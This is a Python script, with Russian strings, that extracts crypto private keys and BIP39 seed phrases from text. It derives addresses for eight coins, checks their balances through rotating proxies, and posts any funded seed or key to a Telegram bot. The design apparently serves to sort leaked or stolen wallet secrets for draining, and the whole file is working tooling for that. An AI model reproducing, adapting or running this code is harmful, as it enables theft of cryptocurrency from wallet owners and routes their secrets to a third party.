from hdwallet import HDWallet
import requests, threading, random, time, json, os, re, datetime, multiprocessing, random
from bs4 import BeautifulSoup
from config import *


def timer(func):
    def wrapper(*args, **kwargs):
        start_time = time.time()
        result = func(*args, **kwargs)
        end_time = time.time()
        print('Время выполнения функции {} составило {:.4f} секунд.'.format(func.__name__, end_time - start_time))
        return result
    return wrapper

def send_tg(text, d_n = True, stuk = False):
    tk = T_ST if stuk else T
    for id in IDS:
        r = requests.get(f'https://api.telegram.org/bot{tk}/sendMessage?chat_id={id}&text={text}&disable_notification={"true" if d_n else "false"}&parse_mode=html')
        
def send_file_tg(path, stuk = False):
    tk = T_ST if stuk else T
    for id in IDS:
        r = requests.post(f'https://api.telegram.org/bot{tk}/sendDocument', data = {'chat_id': id, 'caption': None}, files = {'document': open(path, 'rb')})

class tg_tqdm():
    def __init__(self, ms:int, name, d = '⬜️', nd = '⬛️', len_stripe = 100, delta_sec = None):
        self.clock = ('🌕🌖🌗🌘🌑🌒🌓🌔')
        self.clock_i = 0 
        self.ms = ms
        self.D = d
        self.ND = nd
        self.LEN_STRIPE = len_stripe
        self.name = name
        self.delta_sec = delta_sec if delta_sec != None and delta_sec != 0 else 5
        self.line = self.ND*self.LEN_STRIPE
        self.status = f'0/{ms} | {round((0/ms)*100, 2)}% | {self.clock[self.clock_i]} {datetime.datetime.now().strftime("%d.%m %H:%M:%S")}'
        text = f'{self.name}\n{self.line}\n{self.status}'
        self.last_text = text
        self.message_data = {}
        for id in IDS:
            r = requests.get(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={id}&text={text}&parse_mode=html')
            tr = 0
            while r.status_code != 200:
                time.sleep(1)
                r = requests.get(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={id}&text={text}&parse_mode=html')
                tr += 1
                if tr >= 10:
                    time.sleep(1.01*tr)
                    tr += -2
            self.last_send = time.time()
            self.message_data[id] = r.json()['result']['message_id']
    
    def check(self, n, lstI = None, anyth = False):
        #n += 1
        #print(time.time() - self.last_send)
        if time.time() - self.last_send >= self.delta_sec or anyth:
            self.clock_i += 1
            self.status = f'{n}/{self.ms} | {round((n/self.ms)*100, 2)}% | {self.clock[self.clock_i%len(self.clock)]} {datetime.datetime.now().strftime("%d.%m %H:%M:%S")} | {f"{lstI} Сек" if lstI != None else ""}'
            text = f'{self.name}\n{self.line}\n{self.status}'
            self.line = (self.D * int(n/self.ms*self.LEN_STRIPE)) + (self.ND*(self.LEN_STRIPE - int(n/self.ms*self.LEN_STRIPE)))
            text = f'{self.name}\n{self.line}\n{self.status}'
            for id in IDS:
                r = requests.get(f'https://api.telegram.org/bot{T}/editMessageText?chat_id={id}&message_id={self.message_data[id]}&text={text}&parse_mode=html')
                tr = 0
                while r.status_code != 200:
                    #print(time.time() - self.last_send)
                    time.sleep(1)
                    r = requests.get(f'https://api.telegram.org/bot{T}/editMessageText?chat_id={id}&message_id={self.message_data[id]}&text={text}&parse_mode=html')
                    tr += 1
                    if anyth and tr >10:
                        r = requests.get(f'https://api.telegram.org/bot{T}/sendMessage?chat_id={id}&text={text}&parse_mode=html')
                        r1 = requests.get(f'https://api.telegram.org/bot{T}/deleteMessage?chat_id={id}&message_id={self.message_data[id]}&parse_mode=html')
                        self.message_data[id] = r.json()['result']['message_id']
                    
                    elif tr >10 and not anyth:
                        break

            self.last_send = time.time()
            self.last_text = text
            
def find_data(str_):
    res = None
    if any(f'{x}' in str_ for x in range(0,10)):
        try:
            res = re.findall(r'[01234567890abcdef]{64}',str_)[0]
        except:
            ...
    if res == None:
        pattern = r'\b(?:{})\b'.format('|'.join(map(re.escape, BEP39)))
        cleaned_words = re.findall(pattern, str_)
        res = ' '.join(cleaned_words)
    
    return res if str_ != '' else None

def get(str_, name, path = None, format_ = None):
    path = CFG['адреса'][name][0] if path == None else path
    format_ = CFG['адреса'][name][1] if format_ == None else format_
    try:
        if len(str_.split()) in (12, 18, 24):
            seed = str_
            rr = HDWallet(symbol = name).from_mnemonic(seed).from_path(path).dumps()
        else:
            private_key = str_
            rr = HDWallet(symbol = name).from_private_key(private_key).dumps()
        #print(str(json.dumps(rr, indent=4, ensure_ascii=False)))
        return rr['addresses'][format_]
    except:
        return None

def get_trx(address):
    kk = 0
    while True:
        try:
            proxy = random.choice(PROXY)
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}
            all_token = requests.get(f'https://apilist.tronscanapi.com/api/accountv2?address={address}', proxies=proxies).json()['withPriceTokens']
            res = {_['tokenAbbr'] : float(_['amount']) for _ in all_token}
            
            res1 = {}
            for name, data in res.items():
                if name in ['trx']:#, 'USDT']:
                    res1[name] = data
            
            return res1
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_eth(address):
    kk = 0
    while True:
        res = 0
        proxy = random.choice(PROXY)
        proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
        proxies = {"http": proxy_, "https": proxy_}
        try:
            res = requests.get(f'https://explorer-web.api.btc.com/v1/eth/accounts/{address}', proxies=proxies).json()
            try:
                res = res['data']['balance_eth']
            except:
                res = 0
            return {'ETH' : float(res)} 
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_deep_eth(address):
    while 1:
        kk = 0
        res_ = []
        proxy = random.choice(PROXY)
        proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
        proxies = {"http": proxy_, "https": proxy_}

        res = requests.get(f'https://api.blockchair.com/ethereum/dashboards/address/{address}?erc_20=precise&erc_721=true&assets_in_usd=true&contract_details=true&transactions_instead_of_calls=true', proxies=proxies).json()
        if res['context']['code'] == 200:
            try:
                for token_data in res['data'][address.lower()]['layer_2']['erc_20']:
                    res_.append({token_data['token_symbol'] : token_data['balance']})
            except:
                ...

            try:
                for nft_data in res['data'][address.lower()]['layer_2']['erc_721']:
                    res_.append({nft_data['token_symbol'] : nft_data['token_address']})
            except:
                ...
            return res_
        else:
            kk += 1
            if kk >= 10:
                time.sleep(30)
                kk = 0
            time.sleep(1)
    
def get_btc(address):
    kk = 0
    while 1:
        try:
            res = 0
            proxy = random.choice(PROXY)
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}
            res = requests.get(f'https://api.blockchain.info/haskoin-store/btc/address/{address}/balance', proxies=proxies).json()['confirmed']
            return {'BTC' : res/10**8 } 
        
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_zec(address):
    kk = 0
    while True:
        try:
            proxy = random.choice(PROXY) 
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}
            
            res = requests.get(f'https://zcashblockexplorer.com/address/{address}', proxies=proxies).text
            bss = BeautifulSoup(res, 'html.parser')
            
            res = bss.find_all('div', {'class' : 'inline-flex'})[0].text
            res = float(re.findall(r'\d{1,999}.\d{1,999}', res)[0])
            
            return {'ZEC' : res} 
            
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_qtum(address):
    kk = 0
    while 1:
        try:
            res = 0
            proxy = random.choice(PROXY)
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}

            res = requests.get(f'https://qtumblockexplorer.com/address/{address}', proxies=proxies).text
            bss = BeautifulSoup(res, 'html.parser')
            res = bss.find_all("p", {"class" : "title is-5"})
            res = res[1].text.replace(' QTUM', '')
            res = float(res)
            return {'QTUM' : res} 
        
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_dash(address):
    kk = 0
    while True:
        try:
            proxy = random.choice(PROXY) 
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}
            
            res = requests.get(f'http://explorer.dash.org/insight-api/addr/{address}/balance', proxies=proxies, timeout = 5).json()
            res = float(res)/10**8
            return {'DASH' : res} 
                                        
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_ltc(address):
    kk = 0
    while True:
        try:
            proxy = random.choice(PROXY) 
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}
            
            res = requests.get(f'https://litecoinblockexplorer.net/address/{address}', proxies=proxies).text
            bss = BeautifulSoup(res, 'html.parser')
            
            res = bss.find_all('p', {'class' : 'title is-5'})[1].text
            res = float(re.findall(r'\d{1,999}', res)[0] if re.findall(r'\d{1,999}.\d{1,999}', res) == [] else re.findall(r'\d{1,999}.\d{1,999}', res)[0])
            
            return {'LTC' : res} 
            
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_doge(address):
    kk = 0
    while True:
        try:
            proxy = random.choice(PROXY) 
            proxy_ = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
            proxies = {"http": proxy_, "https": proxy_}
            
            res = requests.get(f'https://dogechain.info/api/v1/address/balance/{address}', proxies=proxies).json()['balance']
            res = float(res)
            return {'DOGE' : res} 
            
        except:
            kk += 1
            if kk > 10: 
                time.sleep(5)
                kk = 0
            time.sleep(0.5)

def get_balance(name, address):
    res = {name : 0}
    if address != None:
        if name == 'BTC':
            res = get_btc(address)
        elif name == 'ETH':
            res = get_eth(address)
        elif name == 'TRX':
            res = get_trx(address)
        elif name == 'QTUM':
            res = get_qtum(address)
        elif name == 'ZEC':
            res = get_zec(address)
        elif name == 'DASH':
            res = get_dash(address)
        elif name == 'LTC':
            res = get_ltc(address)
        elif name == 'DOGE':
            res = get_doge(address)

    return res 

def file_exist(path):
    try:
        f = open(path)
        info = True
    except IOError:
        info = False
    finally:
        try:
            f.close()
        except:
            ...
    return info
        
def check_process(n_pr:int, seed_private:str, config_token = CFG['адреса']) -> list:
    s_res_path  = f'./temp/super_res_{n_pr}.txt'
    res_path  = f'./temp/res_{n_pr}.txt'
    paths = s_res_path, res_path
    for path in paths:
        i = file_exist(path)
        if i == False:
            with open(path, 'w'):...
    str_ = seed_private
    datas = []
    res_str = {'str' : str_, 'address' : {}}
    for _ in config_token.keys():
        path = config_token[_][0]
        ff = config_token[_][1]
        res_str['address'][_] = get(str_, path = path, name = _ , format_ = ff)
        
    datas = []
    for name, address in res_str['address'].items():
        data = get_balance(name, address)
        datas.append(data)
        
        if any(data[x] > 0 for x in data.keys()):
            send_tg(f"<code>{str_}</code>\n{data}", stuk = True)
            with open(s_res_path, 'a') as e:
                e.seek(0, 2)
                e.write(f"{str_} | {json.dumps(data)}\n")
    with open(res_path, 'a') as e:
        e.seek(0, 2)
        e.write(f"{str_} | {json.dumps(datas)}\n")
    return str_, datas

def _check_process(n_pr:int, seed_private:str, config_token = CFG['адреса']) -> None:
    time.sleep(random.randint(2, 10))

#print(check_process(0, 'e40fe1e81fba4f60bd55aa2cbd0b482503cf2d9e5b68cd6d0e5a149f983985c4'))